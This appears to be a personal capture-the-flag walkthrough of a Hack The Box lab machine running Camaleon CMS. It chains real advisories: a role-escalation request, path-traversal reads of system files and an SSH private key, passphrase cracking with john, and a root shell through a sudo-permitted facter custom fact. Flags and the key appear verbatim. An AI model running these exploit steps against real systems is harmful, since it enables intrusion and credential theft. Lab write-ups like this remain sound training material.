Network enumeration:

```
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp    open  http    syn-ack nginx 1.26.3 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 8C83ADFFE48BE12C38E7DBCC2D0524BC
|_http-title: facts
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  unknown syn-ack
| fingerprint-strings:
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18906BC16EEFCDD2
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 02 Feb 2026 11:52:12 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18906BC16EEFCDD2</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 02 Feb 2026 11:52:12 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.94SVN%I=7%D=2/2%Time=69808FEB%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Accept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20a
SF:pplication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max
SF:-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x
SF:20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX
SF:-Amz-Request-Id:\x2018906BC16EEFCDD2\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2002\x20
SF:Feb\x202026\x2011:52:12\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20enc
SF:oding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\
SF:x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><R
SF:equestId>18906BC16EEFCDD2</RequestId><HostId>dd9025bab4ad464b049177c95e
SF:b6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions
SF:,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x2002\x
SF:20Feb\x202026\x2011:52:12\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RT
SF:SPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessio
SF:nReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

then:

```
ajdev@rootbox:~$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://facts.htb/FUZZ -fc 500 -fw 1328

js              [Status: 200, Size: 1146, Words: 135, Lines: 10, Duration: 496ms]
admin                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 579ms]
search       [Status: 200, Size: 19187, Words: 3276, Lines: 272, Duration: 676ms]
.js             [Status: 200, Size: 1146, Words: 135, Lines: 10, Duration: 883ms]
rss               [Status: 200, Size: 647, Words: 78, Lines: 13, Duration: 955ms]
ajax                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 937ms]
404            [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 937ms]
sitemap        [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 482ms]
post         [Status: 200, Size: 11308, Words: 1414, Lines: 152, Duration: 645ms]
captcha          [Status: 200, Size: 5459, Words: 20, Lines: 18, Duration: 735ms]
500          [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 1698ms]
robots              [Status: 200, Size: 33, Words: 2, Lines: 1, Duration: 1781ms]
welcome     [Status: 200, Size: 11966, Words: 1481, Lines: 130, Duration: 1894ms]
up                  [Status: 200, Size: 73, Words: 4, Lines: 1, Duration: 1572ms]
400           [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 1797ms]
json            [Status: 200, Size: 2162, Words: 144, Lines: 1, Duration: 1722ms]
.rss             [Status: 200, Size: 647, Words: 78, Lines: 13, Duration: 1891ms]
422          [Status: 200, Size: 8380, Words: 1063, Lines: 115, Duration: 1791ms]
```

```
# in /rss found

Discover Amazing Trivia! Looking to learn something new while killing a little time? You’re in the right place! Explore a world of trivia, quirky knowledge, and surprising facts that will make ... September 07, 2025 21:57 January 08, 2026 15:41 http://facts.htb/welcome 2 http://facts.htb/assets/camaleon_cms/image-not-found-fc3c0e66dc61abf74010e63ef65a2e23c4cb40a3320408f2711f82fdc22b503f.png
```

```
# when i go to /ajax display nothing but using curl

ajdev@rootbox:~$ curl -v http://facts.htb/ajax
* Host facts.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.21.19
*   Trying 10.129.21.19:80...
* Connected to facts.htb (10.129.21.19) port 80
> GET /ajax HTTP/1.1
> Host: facts.htb
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.26.3 (Ubuntu)
< Date: Mon, 02 Feb 2026 12:09:17 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< x-xss-protection: 0
< x-content-type-options: nosniff
< x-permitted-cross-domain-policies: none
< referrer-policy: strict-origin-when-cross-origin
< vary: Accept
< cache-control: no-cache
< set-cookie: _factsapp_session=lVo4srMSM3eJIqR05vEC4kv6R799iL06mL87eIoQ9HvCveIb8zQOsfESdLijWyi3%2BJ5nvMuByyWsXBJ8zSkVHAd%2B0DU0dYc8hSbnhm0ffdhhyMFiytbG9NaZgFZ8F4Uj4sWz5Cpx%2FlTaBJacgaxRyk3vb%2Bvd41BX29yS9IyerFZJAYAEeo0CwZ8%3D--kZ5nFmwbaAGb4Nim--78TdK%2BXUESR4s4I%2Br%2BLrdg%3D%3D; path=/; httponly; samesite=lax
< x-request-id: 8daefcd3-e2da-4dca-854f-2d7d1992ac0f
< x-runtime: 0.012077
<
* Connection #0 to host facts.htb left intact
```

```
# http://facts.htb/captcha is just a image & http://facts.htb/robots shows Sitemap: http://facts.htb/sitemap

# http://facts.htb/up is just a green whole screen
```

```
# think found something in http://facts.htb/json

{
  "id": 2,
  "created_at": "2025-09-07T21:57:52.704Z",
  "title": "Welcome",
  "description": "Discover Amazing Trivia! Looking to learn something new while killing a little time? You’re in the right place! Explore a world of trivia, quirky knowledge, and surprising facts that will make ...",
  "url": "http://facts.htb/welcome",
  "slug": "welcome",
  "thumb": "http://facts.htb/assets/camaleon_cms/image-not-found-fc3c0e66dc61abf74010e63ef65a2e23c4cb40a3320408f2711f82fdc22b503f.png",
  "post_type_id": 7,
  "updated_at": "2026-01-08T15:41:55.065Z",
  "status": "published",
  "post_parent": null,
  "published_at": null,
  "user_id": 1,
  "post_order": 1,
  "is_feature": false,
  "content": "<header style=\"text-align: center; padding: 100px 20px;\"><!-- Logo --><img style=\"display: block; margin: 0 auto 40px;\" src=\"http://facts.htb/randomfacts/logopage.png\" alt=\"Facts Logo\" width=\"180\" height=\"140\" /><!-- Headline --><h1 style=\"font-size: 3.5rem; margin-bottom: 30px; color: #222;\">Discover Amazing Trivia!</h1><!-- Subheading --><p style=\"font-size: 1.5rem; max-width: 800px; margin: 0 auto 40px; line-height: 1.8; color: #444;\">Looking to learn something new while killing a little time? You&rsquo;re in the right place! Explore a world of trivia, quirky knowledge, and surprising facts that will make you say, <em>&ldquo;Wow, I never knew that!&rdquo;</em></p><!-- Call-to-action button --><a href=\"/animal-ejected\" class=\"btn\" style=\"display: inline-block; background-color: #ff6f61; color: #fff; font-size: 1.3rem; padding: 18px 40px; border-radius: 8px; text-decoration: none; transition: background-color 0.0s;\">Start Exploring</a></header>",
  "visits": 246,
  "urls": {
    "en": "http://facts.htb/welcome"
  },
  "comments": [],
  "fields": [],
  "categories": [],
  "tags": [],
  "owner": {
    "id": 1,
    "username": "admin",
    "name": "Administrator",
    "avatar": "http://facts.htb/assets/camaleon_cms/admin/img/no_image-a044ea5fa02b42e28297797c3bd073a12314c541b1c014c2e18939e08262f495.jpg",
    "url": "http://facts.htb/profile/1-administrator"
  }
}
```


```
# i create a user in the admin page and found

Copyright © 2015 - 2026 [Camaleon CMS.](https://camaleon.website/)

[See intro.](http://facts.htb/admin/dashboard#)

Version 2.9.0

found cve https://github.com/advisories/GHSA-rp28-mvq3-wf8j

## CVE-2025-2304

POST /admin/users/5/updated_ajax HTTP/1.1
Host: facts.htb
Content-Length: 192
X-CSRF-Token: p33_DuI4794Bp520paCpN13Jnk4G5Prn5g39AXxRBFNpxChKhZ1oL0rGd4nyuf_zZVlClSgW73tnuCveritaow
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Origin: http://facts.htb
Referer: http://facts.htb/admin/profile/edit
Accept-Encoding: gzip, deflate, br
Cookie: auth_token=TxNXpRRU19ZO8YP1oXH7Uw&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F144.0.0.0+Safari%2F537.36&10.10.15.98; _factsapp_session=5slRU9Vl6%2BFm24F%2BAaGWSMms0sYsjd%2FgyErNo%2FQsx%2BOY6NRnOyVFkm7NHG08%2Bboo2UKlQKmM%2BO594wYu2bccS3nQz7UBXS65hc8reHpR3KU5pIu%2FA%2FH924QVCw9vy8RBn%2Fe3NWfh14K1nsknIUYBxzP1KnM2SJGfqp5JFzkCoDKhWN698VVzcdNyYHi90NCx0saCDN3HtxRJsnT0fhwzZFaHxz0HFa0wix0kY7rUrLhRqil%2BFPrDF%2BTSAsg24Bn1J1e1%2FVEzj2jonhhxDtx606OnuHIaUzInZ0fXtiq9fhh%2BQbE9R90YIGWLK3HFdm9vYyz2EG5iuEZjtN9PxF6FRLQ7cdFMvN1qSmyg98oSBBi2LfwBKgpjaBXLEJtlmfbmHORLuWiJeWzO7m%2FImoloq%2Fm49HII7TLMD6TdYjfWZPoK--AslKLwVghiiFQ9Os--8g0aPzGUG9qOudCKJ8zogw%3D%3D
Connection: keep-alive

_method=patch&authenticity_token=p33_DuI4794Bp520paCpN13Jnk4G5Prn5g39AXxRBFNpxChKhZ1oL0rGd4nyuf_zZVlClSgW73tnuCveritaow&password%5Bpassword%5D=test10&password%5Bpassword_confirmation%5D=test10&password[role]=admin

by this way we can get the admin role
```

```
now after reading the cve found https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c

where a path traversal vulnerability accessible

http://facts.htb/admin/media/download_private_filefile=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false

then try to get the flag

http://facts.htb/admin/media/download_private_file?file=../../../../../../home/william/user.txt

d4b1d53271451562b47c432921785065
```

```
# then found the crontab  /admin/media/download_private_file?file=../../../../../../etc/cron.d/

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

```
then http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/logrotate.d

/var/log/nginx/*.log {
	daily
	missingok
	rotate 14
	compress
	delaycompress
	notifempty
	create 0640 www-data adm
	sharedscripts
	prerotate
		if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
			run-parts /etc/logrotate.d/httpd-prerotate; \
		fi \
	endscript
	postrotate
		invoke-rc.d nginx rotate >/dev/null 2>&1
	endscript
}
```

```
GET /admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519 HTTP/1.1
Host: facts.htb

found id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDDQGaeC4
TryXp035r4usTuAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIC4H/Rkhchr/qaF+
zGIP81HLNvZZGU+gVyBMZY3QSSlZAAAAoFqgOg5lNgaqrXAykL7A4ODUrrg613Q3gPuWXN
6fv786HlikqVz5jsysOeas1XSRmC4l+4APHZvIvavOzsSg4xR1RvV+nWMCUF07A2I+FCuz
CuElUCi1hVBnYKQU6qrnYwHa2G5h4FvYKdQrOJzDfc3+0ICCwOkPPsVDP9XgFmSGTVys1r
g4A1fVyrzdBmDIRtEdud2JwdrqWK3mBlvqZYw=
-----END OPENSSH PRIVATE KEY-----

then:

ajdev@rootbox:~/HTB/Facts$ python3 ~/john/run/ssh2john.py ~/HTB/Facts/id_rsa > ~/HTB/Facts/id_rsa.hash
ajdev@rootbox:~/john/run$ ./john ~/HTB/Facts/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
dragonballz      (/home/ajdev/HTB/Facts/id_rsa)
1g 0:00:00:26 DONE (2026-02-03 16:13) 0.03723g/s 119.1p/s 119.1c/s 119.1C/s qwertyui..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
now can get to ssh

ajdev@rootbox:~/HTB/Facts$ ssh -i id_rsa trivia@facts.htb
The authenticity of host 'facts.htb (10.129.23.188)' can't be established.
ED25519 key fingerprint is SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Feb  3 10:29:47 AM UTC 2026

  System load:           0.09
  Usage of /:            71.7% of 7.28GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.129.23.188
  IPv6 address for eth0: dead:beef::250:56ff:feb0:62c9


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ ls
trivia@facts:~$ ls -la
total 36
drwxr-x--- 6 trivia trivia 4096 Jan 28 16:17 .
drwxr-xr-x 4 root   root   4096 Jan  8 17:53 ..
lrwxrwxrwx 1 root   root      9 Jan 26 11:40 .bash_history -> /dev/null
-rw-r--r-- 1 trivia trivia  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 trivia trivia 3900 Jan  8 18:19 .bashrc
drwxrwxr-x 3 trivia trivia 4096 Jan  8 18:01 .bundle
drwx------ 2 trivia trivia 4096 Jan  8 18:58 .cache
drwxrwxr-x 3 trivia trivia 4096 Jan  8 17:52 .local
-rw-r--r-- 1 trivia trivia  807 Aug 20  2024 .profile
drwx------ 2 trivia trivia 4096 Feb  3 09:12 .ssh
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

this mean trivia can run facter As root without password

facter is a system information tool used by Puppet.facter is written in Ruby, It can load and execute Ruby code, It supports custom facts (plugins)

so If I can make facter execute Ruby code and I run facter with sudo, then my Ruby code runs as root.

Resource[https://gtfobins.org/gtfobins/facter/]

now making file in /tmp

nano pwn.rb

Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end

and save it then run this:

trivia@facts:/tmp$ sudo facter -p --custom-dir=/tmp
^[[D[2026-02-03 10:54:34.042144 ] ERROR Facter - Could not load puppet gem, got cannot load such file -- puppet
root@facts:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@facts:/tmp# cd
root@facts:~# cd /root/
root@facts:~# ls
minio-binaries  ministack  root.txt  snap
root@facts:~# cat root.txt
f4afc2f2e3d5b188080bb07b18dd922e

facter is a Ruby‑based tool, and because the system allows you to run it with sudo without a password, you can make it load a Ruby script that executes a command as root.
```










